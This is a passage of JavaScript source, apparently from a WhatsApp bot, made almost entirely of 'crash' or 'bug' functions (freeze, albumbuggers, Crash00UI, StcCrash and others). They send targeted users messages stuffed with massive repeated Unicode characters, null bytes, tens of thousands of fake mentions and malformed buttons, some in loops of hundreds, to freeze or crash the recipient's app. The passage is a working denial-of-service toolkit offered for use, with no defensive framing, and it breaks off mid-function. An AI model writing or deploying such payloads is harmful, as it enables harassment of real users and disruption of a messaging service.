            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(6000),
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: "𑇂𑆵𑆴𑆿".repeat(10000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }, 
          mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
        }
      }
    }
  };

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}
    
    


    
    
async function freeze(target) {
    await XeonBotInc.relayMessage(target, {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "SPIDER 🕷️🕸️- StickerPack" + "ꦾ".repeat(70000),
        publisher: "SPIDER 🕷️ 🕸️ Mp4",
        stickers: [
          { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "Jawa Jawa", isLottie: false, mimetype: "image/webp" },
          { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "6285215587498@s.whatsapp.net",
            ...Array.from({ length: 25000 }, () =>
                `${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
            )
          ]
        },
        packDescription: "",
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED"
      }
    }, {});
console.log(`send bug to ${target}`);
}

//==============================================================\\

async function albumbuggers1(target, mention) {

  const imageCrash = "https://files.catbox.moe/8c1rds.jpg";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: XeonBotInc.waUploadToServer
  });

  await XeonBotInc.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: XeonBotInc.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 30000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "5521992999999@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    msg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "ꦽ".repeat(9999),
            phoneNumber: "+5521992999999"
        }
      },
      {
          type: "url",
          urlButton: {
            displayText: "ꦽ".repeat(9999),
            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(66666))
        }
      },
      {
          type: "unknown_type",
          weirdButton: {
            displayText: "ꦽ".repeat(9999),
            payload: "\u0000".repeat(9999)
        }
      },
    ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
          params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(9999) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+5521992999999" 
            }
        ]
      }
    };

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await XeonBotInc.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

async function albumbuggers2(target, mention) {
  const imageCrash = "https://files.catbox.moe/8c1rds.jpg";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: XeonBotInc.waUploadToServer
  });

  await XeonBotInc.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: XeonBotInc.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 40000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "5521992999999@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: target,
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    msg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "ꦽ".repeat(9999),
            phoneNumber: "+5521992999999"
          }
        },
        {
          type: "url",
          urlButton: {
            displayText: "ꦽ".repeat(9999),
            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(66666))
          }
        },
        {
          type: "unknown_type",
          weirdButton: {
            displayText: "ꦽ".repeat(9999),
            payload: "\u0000".repeat(9999)
          }
        }
      ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
        params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(9999) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+5521992999999" 
            }
        ]
      }
    };

    await XeonBotInc.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    if (mention) {
      await XeonBotInc.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}
//==============================================================\\

async function xiosinvi(target){
	const xeonIpong = "Telegram: @B_o_d_a1FR "+ "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram: @B_o_d_a1FR","flow_id":"Telegram: @B_o_d_a1FR","flow_message_version":"9.903","flow_token":"Telegram: @B_o_d_a1FR"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Telegram: @B_o_d_a1FR" }]
                    }
                }
            }
        }
    }), { userJid: target });
await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @B_o_d_a1FR" + xeonIpong,
            url: "https://youtube.com/@DGXeom"
        }
    }, { participant: { jid: target } });
    
    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @B_o_d_a1FR" + xeonIpong,
            url: "https://youtube.com/@ "
        }
    }, { participant: { jid: target } });
    }
//==============================================================\\

async function xeonIosInvi(isTarget) {
await XeonBotInc.sendMessage(isTarget, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ Telegram ::  13 ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ Telegram ::  13 ⛧`,
body: `Haii`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/ `
}
}
}, {})
}
//==============================================================\\
    async function Crash00UI(IsTarget, ptcp = false) {
 const msg = generateWAMessageFromContent(IsTarget, {
    extendedTextMessage: {
      text: '🩸⃟⃨〫⃰‣ ⁖𝐓𝐳𝐗 ‌𖣂︎‌ 𝐓›𝐞𝐚‌𝐦⃜' + "ꦾ".repeat(50000),
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
        ),
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: true,
        isForwarded: true,
        forwardingScore: 9999
      }
    }
  }, {})
  
  await XeonBotInc.relayMessage(IsTarget, msg.message, ptcp ? 
    { messageId: msg.key.id } :
    { participant: { jid: IsTarget }, messageId: msg.key.id })
  
  console.log(chalk.green("─────「 ⏤ CrashUI Ex3cute 」─────"))
}
    
    async function BlankSpamKevv(target) {
  try {
    const Toyaexe2 = [
      {
        buttonId: ".id1",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id2",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id3",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      }
    ];

    const Toyaexe = {
      location: {
        degreesLatitude: -1,
        degreesLongitude: -1,
        name: "Telegram@comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
        address:" Telegram@comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000)
      },
      caption: "Telegram@comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
      footer: " ",
      Toyaexe2,
      headerType: 6
    };

    await XeonBotInc.sendMessage(target, Toyaexe);
  } catch (err) {
  }
}
    
    
    
    async function crash0ui(target) {
  await XeonBotInc.relayMessage(target, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "Crach_v1_elbhrawe?" + "ꦽ".repeat(7000),
          contentText: "HX | Crach_v1_elbhrawe" + "ꦽ".repeat(7000),
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/Crach_v1_elbhrawe",
                    unconsentedUsersUrl: "https://t.me/B_o_d_a1FR",
                    consentedUsersUrl: "https://t.me/B_o_d_a1FR",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/BrandoBrandoBran",
                    unconsentedUsersUrl: "https://t.me/BrandoBrandoBran",
                    consentedUsersUrl: "https://t.me/BrandoBrandoBran",
                    cardIndex: 2,
                  },
                ],
              },            
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "~>",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
                  version: 3
                }
              }
            }
          },
          headerType: 1
        }
      }
    }
  }, {
    participant: { jid:target }
  });
}
async function NotifXButton(XeonBotInc, target) {
  try {
    const content = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            header: { title: "Poppies Lane Memory ( Ziee ⸙ )" + "ꦽ".repeat(10000)+".com" },
            body: { text: "" },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u200B".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u200B".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                }
              ]
            }
          }
        }
      }
    };

    const msg = await generateWAMessageFromContent(target, content, {
      userJid: XeonBotInc?.user?.id
    });

    await XeonBotInc.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (error) {
  }
}

async function callSystem(XeonBotInc, target) {
  await XeonBotInc.sendMessage(target, {
    interactiveMessage: {
      body: {
        text: "Poppies Lane Memory ( Ziee ⸙ )"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(20000),
              url: null,
              merchant_url: null
            })
          }
        ]
      }
    }
  });
}

async function frezeeClick(XeonBotInc, target) {
  const zieeMsg = {
    interactiveMessage: {
      header: {
        hasMediaAttachment: false,
        title: "Poppies Lane Memory ( Ziee ⸙ )"
      },
      body: { text: "\x10" },
      footer: { text: "\x10" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              id: null
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              id: null
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              url: "https://"+"𑜦𑜠".repeat(10000)+".com"
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              copy_code: "𑜦𑜠".repeat(10000)
            })
          }
        ],
        messageParamsJson: JSON.stringify({})
      }
    }
  };

  try {
    await XeonBotInc.sendMessage(target, zieeMsg);
  } catch (err) {
  }
}

async function exTension(XeonBotInc, target, mention = true) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            body: {
              text: "Poppies Lane Memory ( Ziee ⸙ )" + "ꦽ".repeat(5000) + "𑜦".repeat(5000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "𑜦𑜠".repeat(10000),
                    sections: [
                      {
                        title: "𑜦𑜠".repeat(10000),
                        rows: [
                          { id: "ziee1", title: "𑜦𑜠".repeat(10000), description: "" }
                        ]
                      },
                      {
                        title: "𑜦𑜠".repeat(10000),
                        rows: [
                          { id: "ziee2", title: "𑜦𑜠".repeat(10000), description: "" }
                        ]
                      },
                      {
                        title: "𑜦𑜠".repeat(10000),
                        rows: [
                          { id: "ziee3", title: "𑜦𑜠".repeat(10000), description: "" }
                        ]
                      }
                    ]
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    additionalNodes: mention
      ? [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
              }
            ]
          }
        ]
      : []
  });

  if (mention) {
    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id
    });
  }
}

async function buttonXBlank(target) {
    await XeonBotInc.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "ꦽ".repeat(20000),
                            hasMediaAttachment: true,
                            locationMessage: {
                                degreesLatitude: 0,
                                degreesLongitude: -0,
                            },
                        },
                        body: {
                            text: "Poppies Lane Memory ( Ziee ⸙ )" + "ꦽ".repeat(40000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: JSON.stringify({ status: true }),
                                },
                                {
                                    name: "send_location",
                                    buttonParamsJson: JSON.stringify({ status: true }),
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        id: "reply_quick",
                                    }),
                                },
                                {
                                    name: "open_url",
                                    buttonParamsJson: JSON.stringify({
                                        url: "https://t.me/B_o_d_a1FR",
                                    }),
                                },
                                {
                                    name: "share_contact",
                                    buttonParamsJson: JSON.stringify({
                                        contact_id: "6281234567890@s.whatsapp.net",
                                    }),
                                },
                                {
                                    name: "view_profile",
                                    buttonParamsJson: JSON.stringify({
                                        id: "profile_view",
                                    }),
                                },
                            ],
                        },
                    },
                },
            },
        },
        {
            messageId: null,
            participant: { jid: target },
        },
    );
}

async function UIMention(XeonBotInc, target, mention = true) {
  const qwerty = "https://files.catbox.moe/4x4hzu.jpg"
  const msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { 
              text: "Poppies Lane Memory ( Ziee ⸙ )" + "\u200B" + "ꦾ".repeat(10000) + "ꦽ".repeat(2500) + "ោ៝".repeat(2500)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_id: Date.now(),
                    flow_message_version: "9",
                    flow_token: Date.now(),
                    flow_action: "share",
                    flow_action_payload: {
                      screen: "GALLERY_SCREEN",
                      params: {
                        media_type: "image",
                        max_selection: 9999999
                      }
                    },
                    flow_cta: "x",
                    icon: qwerty,
                    updated_at: null,
                    experimental_flags: {
                      use_native_flow_v2: true,
                      enable_logging_context: true
                    }
                  })
                }
              ]
            },
            ...(mention ? { contextInfo: { mentionedJid: [target] } } : {})
          }
        }
      }
    }),
    {}
  );

  await XeonBotInc.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function StcCrash(target) {
  try {
    let message = {
      extendedTextMessage: {
        text: "Poppies Lane Memory ( Ziee ⸙ )" + "ꦾ".repeat(10000),
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: ["13135550002@s.whatsapp.net"],
          externalAdReply: {
            title: null,
            body: null,
            thumbnailUrl: "http://wa.me/stickerpack/ꦽ" + "...".repeat(5000),
            sourceUrl: "http://wa.me/stickerpack/ꦽ" + "...".repeat(5000),
            mediaType: 1,
            renderLargerThumbnail: false,
            showAdAttribution: false
          }
        },
        nativeFlowMessage: {
          messageParamsJson: "{}",
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: "{}"
              }, 
              {
              name: "template_message",
              buttonParamsJson: "{}"
            }
          ]
        }
      }
    };

    await XeonBotInc.relayMessage(target, message, {
      participant: { jid: target }
    });
  } catch (err) {
    
  }
}

async function Notifspam(target, Ptcp = true) {
    await XeonBotInc.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'video/mp4',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "\u200B",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Poppies Lane Memory ( Ziee ⸙ )" + "ꦾ".repeat(10000) + "@8".repeat(10000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function NativeflowUI(XeonBotInc, target) {
const zieMsg = {
    interactiveMessage: {
        body: { 
            text: "Poppies Lane Memory ( Ziee ⸙ )" + "ꦾ".repeat(10000) + "~@1~".repeat(10000)
        },
        footer: { 
            text: "Percuma kau dekati dia... Kalau cintanya pasti untuk ku...." + "\u200B".repeat(50000) 
        },
        header: {
            title: "Poppies Lane Memory ( Ziee ⸙ )" + "ꦾ".repeat(10000) + "~@1~".repeat(10000),
            subtitle: "\u200B",
            hasMediaAttachment: true,
            locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: "zie",
                address: ""
            }
        },
        nativeFlowMessage: {
            buttons: [
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie1" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie2" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie3" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie4" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie5" }) 
                }
            ]
        }
    }
};

async function LocaliveUI(XeonBotInc, target) {
  try {
    await XeonBotInc.sendMessage(target, {
      location: {
        degreesLatitude: -0,
        degreesLongitude: 0,
        name: "Poppies Lane Memory ( Ziee ⸙ )" + "ꦾ".repeat(10000) + "ꦽ".repeat(10000) + "𑜦𑜠".repeat(10000) + "~@1~".repeat(10000),
        address: " "
      }
    })

    await XeonBotInc.sendMessage(target, {
      liveLocationMessage: {
        degreesLatitude: -0,
        degreesLongitude: 0,
        accuracyInMeters: 5,
        speedInMps: 0,
        degreesClockwiseFromMagneticNorth: 0,
        caption: " ",
        sequenceNumber: 1,
        timeOffset: 0
      }
    })

  } catch (err) {
  }
}

await XeonBotInc.relayMessage(target, zieMsg, { messageId: null });
}  
  
async function forcer(isTarget){
	const rajaXeon = {
  key: {
    remoteJid: '120363401744741900@g.us',
    fromMe: true,
    id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
    participant: '201507151697@s.whatsapp.net'
  },
  messageTimestamp: 1753786706,
  pushName: 'Telegram: @B_o_d_a1FR',
  broadcast: false,
  status: 2,
  message: {
    conversation: 'Telegram: @B_o_d_a1FR',
    messageContextInfo: {
      messageSecret: new Uint8Array([
        123, 153, 59, 66, 69, 1, 31, 219,
        233, 201, 204, 107, 149, 77, 233, 100,
        80, 15, 30, 192, 133, 13, 171, 48,
        44, 27, 61, 135, 73, 149, 172, 105
      ])
    }
  },
  id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
  isBaileys: false,
  chat: '120363401744741900@g.us',
  fromMe: true,
  isGroup: true,
  sender: '201507151697@s.whatsapp.net',
  participant: '201507151697@s.whatsapp.net',
  mtype: 'conversation',
  msg: 'Telegram: @B_o_d_a1FR',
  body: 'Telegram: @B_o_d_a1FR',
  quoted: null,
  mentionedJid: [],
  text: 'Telegram: @B_o_d_a1FR',
  reply: function() {}, // Placeholder for function
  copy: function() {}, // Placeholder for function
  copyNForward: function() {} // Placeholder for function
};
	await XeonBotInc.relayMessage(
    isTarget,
    {
      locationMessage: {
        degreesLatitude: 'Telegram: @B_o_d_a1FR',
